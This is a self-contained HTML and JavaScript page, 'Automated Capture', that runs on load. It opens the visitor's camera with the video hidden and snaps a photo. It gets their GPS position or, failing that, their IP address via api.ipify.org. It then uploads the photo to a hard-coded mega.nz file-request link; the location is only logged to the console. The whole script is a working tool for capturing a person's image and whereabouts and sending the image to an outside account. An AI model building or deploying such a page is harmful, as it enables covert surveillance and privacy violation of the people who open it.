<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Automated Photo & Location Capture</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #121212;
      color: #ffffff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #1e1e1e;
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
      text-align: center;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Automated Capture</h1>
    <p id="status">Initializing...</p>
  </div>

  <script>
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    const statusText = document.getElementById('status');

    let photoData = null;
    let locationData = null;

    async function initialize() {
      statusText.textContent = 'Starting camera...';
      await startCamera();
      statusText.textContent = 'Capturing photo...';
      await capturePhoto();
      statusText.textContent = 'Fetching location...';
      await getLocation();
      statusText.textContent = 'Uploading to MEGA...';
      saveData();
    }

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.play();
        await new Promise(resolve => setTimeout(resolve, 1000));
      } catch (err) {
        statusText.textContent = 'Camera access denied!';
        throw new Error('Camera access denied');
      }
    }

    async function capturePhoto() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      photoData = canvas.toDataURL('image/png');
    }

    async function getLocation() {
      if (navigator.geolocation) {
        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
          });
          locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
        } catch (err) {
          statusText.textContent = 'Location permission denied. Fetching IP address...';
          await fetchIP();
        }
      } else {
        statusText.textContent = 'Geolocation not supported. Fetching IP address...';
        await fetchIP();
      }
    }

    async function fetchIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        locationData = `IP Address: ${data.ip}`;
      } catch (err) {
        statusText.textContent = 'Failed to fetch IP address.';
        throw new Error('Failed to fetch IP address');
      }
    }

    async function uploadToMega(fileBlob) {
      const formData = new FormData();
      formData.append('file', fileBlob, 'photo.png');

      try {
        const response = await fetch('https://mega.nz/filerequest/HVX6VRQXnCI', {
          method: 'POST',
          body: formData
        });

        if (response.ok) {
          statusText.textContent = 'Upload successful!';
        } else {
          statusText.textContent = 'Upload failed!';
        }
      } catch (error) {
        console.error('Upload error:', error);
        statusText.textContent = 'Error uploading file.';
      }
    }

    function saveData() {
      console.log('Photo Data:', photoData);
      console.log('Location Data:', locationData);

      fetch(photoData)
        .then(res => res.blob())
        .then(blob => uploadToMega(blob));
    }

    initialize();
  </script>
</body>
</html>
